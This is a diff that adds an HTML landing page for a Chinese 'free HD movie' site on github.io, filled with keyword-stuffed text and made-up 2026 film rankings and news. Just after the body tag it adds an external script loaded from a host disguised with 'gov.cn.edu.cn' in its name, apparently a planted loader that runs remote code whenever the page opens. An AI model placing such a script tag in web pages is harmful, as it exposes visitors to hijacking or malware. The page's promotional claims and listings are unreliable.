@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="放放电影网,放放电影网在线观看,放放电影网高清免费,fangfangdianyingwang-zh.github.io">
+<meta name="description" content="放放电影网(fangfangdianyingwang-zh.github.io)——轻松放放，随时观影。汇聚海量高清电影、热播剧集与经典老片，打开即看，免费无广告，让好电影随手可得。">
+<title>放放电影网 - 轻松放放 随时观影 | fangfangdianyingwang-zh.github.io</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --green:#1fa463;
+  --green-d:#137a4a;
+  --lime:#b6e62e;
+  --bg:#f4faf5;
+  --ink:#1c2b22;
+  --muted:#7b8a80;
+  --line:#e2efe6;
+  --card:#fff;
+  --dark:#0f2a1c;
+}
+html{scroll-behavior:smooth;}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--ink);line-height:1.8;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1180px;margin:0 auto;padding:0 24px;}
+
+/* announce */
+.ann{background:var(--lime);color:#2b3a10;font-size:13px;padding:9px 0;text-align:center;font-weight:600;}
+.ann a{text-decoration:underline;}
+
+/* header */
+header{background:var(--dark);position:sticky;top:0;z-index:50;}
+.nav{display:flex;align-items:center;justify-content:space-between;padding:16px 0;gap:20px;}
+.logo{font-size:27px;font-weight:900;color:#fff;}
+.logo em{font-style:normal;color:var(--lime);}
+.logo small{display:block;font-size:11px;font-weight:400;color:#9bb5a8;letter-spacing:1px;}
+.search{flex:1;max-width:360px;display:flex;background:rgba(255,255,255,.12);border-radius:30px;overflow:hidden;border:1px solid rgba(255,255,255,.2);}
+.search input{flex:1;background:none;border:none;padding:11px 18px;color:#fff;font-size:14px;outline:none;}
+.search input::placeholder{color:#9bb5a8;}
+.search button{background:var(--green);border:none;color:#fff;padding:0 24px;font-weight:700;cursor:pointer;}
+.search button:hover{background:var(--lime);color:var(--dark);}
+.nav-links{display:flex;gap:4px;list-style:none;align-items:center;}
+.nav-links a{padding:8px 14px;border-radius:20px;font-size:14px;color:#d0e0d8;font-weight:600;transition:.2s;}
+.nav-links a:hover{background:var(--green);color:#fff;}
+.menu-btn{display:none;background:none;border:none;color:var(--lime);font-size:30px;cursor:pointer;}
+
+/* banner */
+.banner{background:linear-gradient(120deg,var(--green),var(--green-d));padding:64px 0;position:relative;overflow:hidden;}
+.banner::after{content:"🎬";position:absolute;right:-30px;top:-20px;font-size:220px;opacity:.12;}
+.banner .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center;}
+.banner h1{font-size:48px;color:#fff;line-height:1.2;font-weight:900;}
+.banner h1 mark{background:var(--lime);color:var(--dark);padding:0 10px;border-radius:6px;}
+.banner p{color:#d8f0e2;font-size:17px;margin:20px 0 26px;}
+.tags{display:flex;flex-wrap:wrap;gap:10px;}
+.tags span{background:rgba(255,255,255,.16);color:#fff;padding:6px 16px;border-radius:20px;font-size:13px;cursor:pointer;}
+.tags span:hover{background:var(--lime);color:var(--dark);}
+.banner-side{background:rgba(255,255,255,.1);backdrop-filter:blur(4px);border:1px solid rgba(255,255,255,.2);border-radius:18px;padding:26px;color:#fff;}
+.banner-side h3{font-size:16px;margin-bottom:16px;color:var(--lime);}
+.banner-side ol{padding-left:22px;}
+.banner-side li{margin-bottom:10px;font-size:15px;}
+.banner-side li b{color:var(--lime);}
+
+/* section */
+section{padding:64px 0;}
+.sec-top{text-align:center;margin-bottom:44px;}
+.sec-top .kicker{color:var(--green);font-weight:800;letter-spacing:2px;font-size:13px;text-transform:uppercase;}
+.sec-top h2{font-size:32px;font-weight:900;margin:8px 0;}
+.sec-top p{color:var(--muted);font-size:15px;}
+.more{display:block;text-align:center;margin-top:34px;}
+.more a{background:var(--card);border:2px solid var(--green);color:var(--green);padding:12px 34px;border-radius:30px;font-weight:700;transition:.3s;}
+.more a:hover{background:var(--green);color:#fff;}
+
+/* film list */
+.list{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;}
+.film{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.3s;}
+.film:hover{border-color:var(--green);transform:translateY(-6px);box-shadow:0 16px 34px rgba(31,164,99,.18);}
+.poster{height:210px;display:flex;align-items:center;justify-content:center;font-size:64px;position:relative;}
+.poster::before{content:"";position:absolute;inset:0;background:linear-gradient(to top,transparent,rgba(0,0,0,.15));}
+.poster em{position:absolute;top:12px;left:12px;font-style:normal;background:var(--green);color:#fff;font-size:11px;padding:3px 10px;border-radius:4px;}
+.poster s{position:absolute;bottom:12px;right:12px;text-decoration:none;background:rgba(0,0,0,.6);color:var(--lime);font-weight:700;font-size:12px;padding:3px 9px;border-radius:4px;}
+.film .info{padding:16px;}
+.film h4{font-size:17px;margin-bottom:5px;}
+.film .meta{font-size:13px;color:var(--muted);margin-bottom:12px;}
+.film .line{display:flex;justify-content:space-between;font-size:13px;}
+.film .line b{color:var(--green);}
+
+/* type strip */
+.strip{background:var(--dark);border-radius:24px;padding:40px;}
+.strip-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:28px;flex-wrap:wrap;gap:12px;}
+.strip-head h2{color:#fff;font-size:26px;}
+.strip-head a{color:var(--lime);font-size:14px;font-weight:600;}
+.strip-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:14px;}
+.type{border:1px solid rgba(255,255,255,.18);border-radius:12px;padding:20px 10px;text-align:center;transition:.3s;}
+.type:hover{background:var(--green);border-color:var(--green);transform:translateY(-4px);}
+.type .i{font-size:32px;display:block;margin-bottom:8px;}
+.type h4{color:#fff;font-size:15px;}
+
+/* news */
+.news{display:grid;grid-template-columns:1.4fr 1fr;gap:30px;}
+.lead{background:var(--card);border-radius:16px;overflow:hidden;border:1px solid var(--line);}
+.lead .ph{height:240px;display:flex;align-items:center;justify-content:center;font-size:80px;}
+.lead .txt{padding:26px;}
+.lead .tag{color:var(--green);font-size:12px;font-weight:700;}
+.lead h3{font-size:22px;margin:8px 0 12px;line-height:1.5;}
+.lead p{color:var(--muted);font-size:14px;}
+.news-list{display:flex;flex-direction:column;gap:16px;}
+.n{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:18px;display:flex;gap:16px;align-items:flex-start;transition:.3s;}
+.n:hover{border-color:var(--green);}
+.n .no{flex:0 0 44px;height:44px;background:var(--bg);color:var(--green);border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:20px;}
+.n h4{font-size:16px;line-height:1.5;}
+.n time{font-size:12px;color:var(--muted);}
+
+/* stats */
+.stats{background:var(--green);border-radius:24px;padding:44px;text-align:center;color:#fff;}
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;}
+.st b{font-size:38px;display:block;font-weight:900;}
+.st span{font-size:14px;opacity:.92;}
+
+/* footer */
+footer{background:var(--dark);color:#aac2b5;margin-top:64px;padding:54px 0 26px;}
+.foot{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:34px;}
+.foot h5{color:#fff;font-size:16px;margin-bottom:16px;}
+.foot ul{list-style:none;}
+.foot li{margin-bottom:10px;}
+.foot a{color:#9bb5a8;font-size:14px;}
+.foot a:hover{color:var(--lime);}
+.copy{text-align:center;color:#6f8a7c;font-size:13px;border-top:1px solid rgba(255,255,255,.1);padding-top:24px;}
+
+@media(max-width:960px){
+  .banner .wrap,.news{grid-template-columns:1fr;}
+  .banner-side{display:none;}
+  .list{grid-template-columns:repeat(2,1fr);}
+  .strip-grid{grid-template-columns:repeat(3,1fr);}
+  .stats-grid{grid-template-columns:1fr 1fr;}
+  .banner h1{font-size:34px;}
+  .foot{grid-template-columns:1fr 1fr;}
+}
+@media(max-width:640px){
+  section{padding:46px 0;}
+  .search{display:none;}
+  .nav-links{position:absolute;top:100%;left:0;right:0;background:var(--dark);flex-direction:column;padding:18px;border-top:1px solid rgba(255,255,255,.1);transform:scaleY(0);transform-origin:top;transition:.3s;}
+  .nav-links.open{transform:scaleY(1);}
+  .menu-btn{display:block;}
+  .banner h1{font-size:28px;}
+  .list,.strip-grid{grid-template-columns:1fr 1fr;}
+  .stats-grid{grid-template-columns:1fr 1fr;}
+  .foot{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="ann">📢 放放电影网（fangfangdianyingwang-zh.github.io）9月观影季开启！<a href="#">查看完整活动片单 ›</a></div>
+
+<header>
+  <div class="wrap nav">
+    <div class="logo">放放<em>电影网</em><small>FANGFANG DIANYING WANG</small></div>
+    <div class="search"><input type="text" placeholder="搜索你想看的电影…"><button onclick="window.location.href='#'">搜索</button></div>
+    <button class="menu-btn" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <ul class="nav-links" id="nav">
+      <li><a href="#">首页</a></li>
+      <li><a href="#hot">正在热播</a></li>
+      <li><a href="#type">影片分类</a></li>
+      <li><a href="#news">影讯资讯</a></li>
+      <li><a href="#about">关于我们</a></li>
+    </ul>
+  </div>
+</header>
+
+<section class="banner">
+  <div class="wrap">
+    <div>
+      <h1>轻松<mark>放放</mark><br>随时看电影</h1>
+      <p>放放电影网（https://fangfangdianyingwang-zh.github.io）——打开网页就能看的免费高清电影站，无广告、无门槛，好电影随手可得。</p>
+      <div class="tags">
+        <span>🎯 院线同步</span><span>🆓 全部免费</span><span>🚀 极速加载</span><span>📱 手机畅看</span><span>🖥️ 1080P 高清</span>
+      </div>
+    </div>
+    <div class="banner-side">
+      <h3>🔥 本季风云榜 TOP 5</h3>
+      <ol>
+        <li>破晓行动 <b>9.4</b></li>
+        <li>春风十里 <b>9.0</b></li>
+        <li>末日邮差 <b>8.8</b></li>
+        <li>她乡月明 <b>8.7</b></li>
+        <li>机甲纪元 <b>8.5</b></li>
+      </ol>
+    </div>
+  </div>
+</section>
+
+<section id="hot">
+  <div class="wrap">
+    <div class="sec-top">
+      <div class="kicker">HOT NOW</div>
+      <h2>正在热播</h2>
+      <p>放放电影网精选当下最值得一看的院线与网络热片</p>
+    </div>
+    <div class="list">
+      <div class="film"><div class="poster">🎯<em>动作</em><s>9.4</s></div><div class="info"><h4>破晓行动</h4><div class="meta">2026 · 中国香港 · 130分钟</div><div class="line"><span>院线热映</span><b>高分推荐</b></div></div></div>
+      <div class="film"><div class="poster">🌾<em>剧情</em><s>9.0</s></div><div class="info"><h4>春风十里</h4><div class="meta">2026 · 中国大陆 · 118分钟</div><div class="line"><span>口碑之作</span><b>必看</b></div></div></div>
+      <div class="film"><div class="poster">📮<em>科幻</em><s>8.8</s></div><div class="info"><h4>末日邮差</h4><div class="meta">2026 · 美国 · 142分钟</div><div class="line"><span>末日题材</span><b>IMAX</b></div></div></div>
+      <div class="film"><div class="poster">🌙<em>爱情</em><s>8.7</s></div><div class="info"><h4>她乡月明</h4><div class="meta">2026 · 日本 · 105分钟</div><div class="line"><span>治愈系</span><b>催泪</b></div></div></div>
+      <div class="film"><div class="poster">🤖<em>科幻</em><s>8.5</s></div><div class="info"><h4>机甲纪元</h4><div class="meta">2026 · 韩国 · 137分钟</div><div class="line"><span>视效大片</span><b>震撼</b></div></div></div>
+      <div class="film"><div class="poster">😂<em>喜剧</em><s>8.3</s></div><div class="info"><h4>好事连连</h4><div class="meta">2026 · 中国大陆 · 99分钟</div><div class="line"><span>合家欢</span><b>解压</b></div></div></div>
+      <div class="film"><div class="poster">🕯️<em>悬疑</em><s>8.6</s></div><div class="info"><h4>无名之罪</h4><div class="meta">2026 · 英国 · 121分钟</div><div class="line"><span>烧脑</span><b>反转</b></div></div></div>
+      <div class="film"><div class="poster">🐉<em>奇幻</em><s>8.4</s></div><div class="info"><h4>山海书生</h4><div class="meta">2026 · 中国大陆 · 133分钟</div><div class="line"><span>国风</span><b>视效炸裂</b></div></div></div>
+    </div>
+    <div class="more"><a href="#">查看全部热播影片 ›</a></div>
+  </div>
+</section>
+
+<div class="wrap">
+  <div class="strip" id="type">
+    <div class="strip-head">
+      <h2>🎞️ 影片分类</h2>
+      <a href="#">浏览全部分类 ›</a>
+    </div>
+    <div class="strip-grid">
+      <div class="type"><span class="i">💥</span><h4>动作</h4></div>
+      <div class="type"><span class="i">😄</span><h4>喜剧</h4></div>
+      <div class="type"><span class="i">💘</span><h4>爱情</h4></div>
+      <div class="type"><span class="i">👽</span><h4>科幻</h4></div>
+      <div class="type"><span class="i">🧩</span><h4>悬疑</h4></div>
+      <div class="type"><span class="i">🎨</span><h4>动画</h4></div>
+    </div>
+  </div>
+</div>
+
+<section id="news">
+  <div class="wrap">
+    <div class="sec-top">
+      <div class="kicker">LATEST NEWS</div>
+      <h2>影讯资讯</h2>
+      <p>放放电影网为你整理最新行业动态与观影指南</p>
+    </div>
+    <div class="news">
+      <div class="lead">
+        <div class="ph">🎬</div>
+        <div class="txt">
+          <div class="tag">独家 · 2026.09.30</div>
+          <h3>《破晓行动》票房破40亿，成为今年首部达成此成绩的动作片</h3>
+          <p>放放电影网带你回顾这部现象级作品的走红轨迹，从点映口碑到全面引爆，拆解它打动观众的核心要素。</p>
+        </div>
+      </div>
+      <div class="news-list">
+        <div class="n"><div class="no">1</div><div><time>09.28</time><h4>秋日宅家片单：8部治愈系电影推荐</h4></div></div>
+        <div class="n"><div class="no">2</div><div><time>09.26</time><h4>从胶片到数字，电影摄影技术的百年变迁</h4></div></div>
+        <div class="n"><div class="no">3</div><div><time>09.24</time><h4>新片速递：本周值得关注的5部院线电影</h4></div></div>
+        <div class="n"><div class="no">4</div><div><time>09.21</time><h4>国漫崛起：近年高分国产动画盘点</h4></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="stats">
+      <div class="stats-grid">
+        <div class="st"><b>12万+</b><span>收录影片</span></div>
+        <div class="st"><b>1080P</b><span>高清画质</span></div>
+        <div class="st"><b>0元</b><span>永久免费</span></div>
+        <div class="st"><b>24h</b><span>每日更新</span></div>
+      </div>
+    </div>
+    <div style="margin-top:34px;text-align:center;max-width:760px;margin-left:auto;margin-right:auto;">
+      <div class="sec-top" style="margin-bottom:16px;">
+        <div class="kicker">ABOUT US</div>
+        <h2>关于放放电影网</h2>
+      </div>
+      <p style="color:var(--muted);">放放电影网（https://fangfangdianyingwang-zh.github.io）是一个人人都能轻松使用的免费电影信息平台。我们相信好电影不该被门槛挡住，所以坚持免费、高清、无广告的体验，每日为你精选院线新片、经典佳作与高分冷门片，让每一次「放放」都物超所值。</p>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <div class="logo">放放<em>电影网</em></div>
+        <p style="margin-top:14px;font-size:14px;">放放电影网(fangfangdianyingwang-zh.github.io)——轻松放放，随时观影，发现每一部值得一看的好电影。</p>
+      </div>
+      <div>
+        <h5>影片频道</h5>
+        <ul><li><a href="#">动作电影</a></li><li><a href="#">喜剧电影</a></li><li><a href="#">爱情电影</a></li><li><a href="#">科幻电影</a></li></ul>
+      </div>
+      <div>
+        <h5>观影服务</h5>
+        <ul><li><a href="#">新片速递</a></li><li><a href="#">高分榜单</a></li><li><a href="#">观影指南</a></li><li><a href="#">常见问题</a></li></ul>
+      </div>
+      <div>
+        <h5>关于我们</h5>
+        <ul><li><a href="#">关于本站</a></li><li><a href="#">投稿合作</a></li><li><a href="#">隐私声明</a></li><li><a href="#">联系我们</a></li></ul>
+      </div>
+    </div>
+    <div class="copy">© 2026 放放电影网 · 网站网址：https://fangfangdianyingwang-zh.github.io · 本站内容仅供影视信息交流与分享，版权归原作者及发行方所有</div>
+  </div>
+</footer>
+
+</body>
+</html>
